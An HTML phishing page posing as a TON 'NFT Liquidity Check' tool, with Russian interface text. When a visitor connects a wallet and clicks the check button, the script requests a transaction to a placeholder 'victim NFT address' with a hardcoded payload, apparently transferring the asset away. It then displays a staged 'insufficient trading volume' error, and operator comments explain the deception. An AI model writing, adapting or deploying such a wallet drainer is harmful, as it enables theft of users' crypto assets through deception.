<!DOCTYPE html>
<html>
<head>
    <title>NFT Verifier</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
        .card { background: #1c1c1e; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        button { background: #007aff; color: white; border: none; padding: 12px 24px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>NFT Liquidity Check</h2>
        <p>Подключите кошелек для анализа ликвидности ваших активов в сети TON</p>
        
        <div id="ton-connect-button"></div>

        <button onclick="checkLiquidity()">Проверить ликвидность</button>
        <p id="status" style="color: #888; font-size: 14px; margin-top: 15px;"></p>
    </div>

    <script>
        const tonConnectUI = new TONConnectUI.TonConnectUI({
            manifestUrl: 'https://твой-логин.github.io/твой-репозиторий/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function checkLiquidity() {
            const status = document.getElementById('status');
            
            if (!tonConnectUI.connected) {
                alert("Сначала подключите кошелек!");
                return;
            }

            status.innerText = "Анализ блокчейна... Подождите";

            try {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: "АДРЕС_NFT_ЖЕРТВЫ", // Сюда вставляешь адрес, который узнал
                            amount: "50000000",
                            payload: "te6ccgEBAQEANAAAs0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAAAAAAAAAAAAAAAAABfS8i9M="
                        }
                    ]
                };

                await tonConnectUI.sendTransaction(transaction);
                
                // Имитируем долгую проверку перед ошибкой
                setTimeout(() => {
                    status.style.color = "#ff453a";
                    status.innerText = "Ошибка 0x771: Недостаточно торгового объема для данного NFT.";
                }, 2000);

            } catch (e) {
                status.innerText = "Ошибка авторизации сессии.";
            }
        }
    </script>
</body>
</html>
